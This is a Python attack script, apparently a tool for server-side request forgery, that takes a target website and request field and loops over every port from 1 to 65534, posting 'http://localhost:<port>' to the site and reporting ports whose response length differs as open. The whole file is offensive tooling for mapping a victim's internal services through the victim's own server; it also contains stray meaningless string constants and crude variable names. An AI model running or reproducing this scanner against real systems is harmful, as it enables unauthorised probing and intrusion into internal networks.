from random import *
import requests
import argparse

parser = argparse.ArgumentParser(description="Python SSRF Automate Internal Ports Discovery")
parser.add_argument('-u', help="Website to target", required=True)
parser.add_argument('--rfield', help="Field of Request in Petition", required=True)
parser.add_argument('--nfield', help="New Field for Request. Syntax: parameter,value", required=False)
parser.add_argument('--hl', help="Hide Results Via Content-Lenght ", required=False)
args = parser.parse_args()


class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR


url = args.u
param = args.rfield
global tita
tita = "1"


if args.hl == None:
    args.hl = 5423523523452345

proxy = {
  'http': 'http://127.0.0.1:8080',
}


l = range(1,65535)
for pene in l:
    pene2 = str(pene)
    payload = "http://localhost:"+pene2
    if args.nfield == None:
        pp = {args.rfield: payload}
    else:
        a = args.nfield.find(",")
        paramet = args.nfield[:a]
        value = args.nfield[a:]
        value2 = value.replace(",","")
        pp = {args.rfield: payload,paramet: value2}        
    reqq = requests.post(url,data=pp,proxies=False)
    sandwix = len(reqq.text)
    global response
    response = int(args.hl)
    response1 = response + 1
    response2 = response + 2
    response3 = response + 3
    response4 = response + 4
    if sandwix == response:
        pass
    else:
        if sandwix == response1:
            pass
        else:
            if sandwix == response2:
                pass
            else:
                if sandwix == response3:
                    pass
                else:
                    if sandwix == response4:
                        pass
                    else:
                        print(f"{bcolors.OK}[+] Open Port:{bcolors.RESET}",pene,f"{bcolors.OK}[-] Content Lenght: {bcolors.RESET}",sandwix)
        
               

